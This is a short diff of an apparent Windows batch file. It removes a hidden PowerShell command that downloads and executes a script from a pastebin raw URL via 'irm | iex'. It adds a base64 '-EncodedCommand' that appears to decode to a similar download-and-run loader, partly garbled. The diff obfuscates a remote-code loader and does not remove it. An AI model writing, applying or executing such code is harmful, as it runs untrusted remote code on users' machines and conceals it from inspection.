@@ -1,3 +1,1 @@
-@echo off
-start "" /b powershell -WindowStyle Hidden -Command "irm 'https://pastebin.com/raw/wv1HvG4T' | iex"
-exit
+powershell -EncodedCommand aQByAG0AIAAiAGgAdAB0AHAAcwA6AC8ALwBwAGEAcwB0AGUAYgBpAG4ALgBjAG8AbQAvAHIAYQByAC8AdwB2ADEASAB2AEcANAAVABAAIAB8ACAAaQBlAHgA
